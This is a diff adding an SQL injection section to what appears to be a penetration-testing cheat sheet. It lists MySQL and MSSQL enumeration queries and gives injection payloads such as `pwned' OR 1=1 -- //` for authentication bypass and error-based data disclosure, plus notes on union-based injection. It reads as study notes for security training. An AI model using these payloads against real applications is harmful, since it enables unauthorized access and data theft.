@@ -86,3 +86,34 @@ Exploiting inputs that execute os commands
 
 ### Notes
 - typically occurs when a web application is not sanitizing the input
+
+## SQL Injection
+Injection of commands to subvert an SQL database query
+
+```mysql
+select version(); -- retrieve DBMS version
+select system_user(); -- retrieve current username and host from the session
+show databases; -- list databases
+```
+
+```mssql
+SELECT @@version; -- retrieve DBMS version
+SELECT name FROM sys.databases; -- list databases
+SELECT * FROM DATABASE.information_schema.tables;  -- list database tables
+select * from DATABASE.dbo.TABLE; -- retrieve contents from a table
+```
+
+### Error-based
+allows for:
+- boolean evaluation subversion (authentication bypass, entries dumping):
+	- `pwned' OR 1=1 -- //`
+- sensitive information disclosure and data exfiltration:
+	- `pwned' OR 1=1 IN (select @@version)`
+
+### Union-based
+Exploiting the UNION to execute an extra SELECT and concatenate both queries. Depends on the satisfaction of two conditions:
+1. The injected query must include the same amount of columns as the original
+2. The data types must be compatible between each column
+
+### Notes
+- typically occurs when a web application is not sanitizing the input
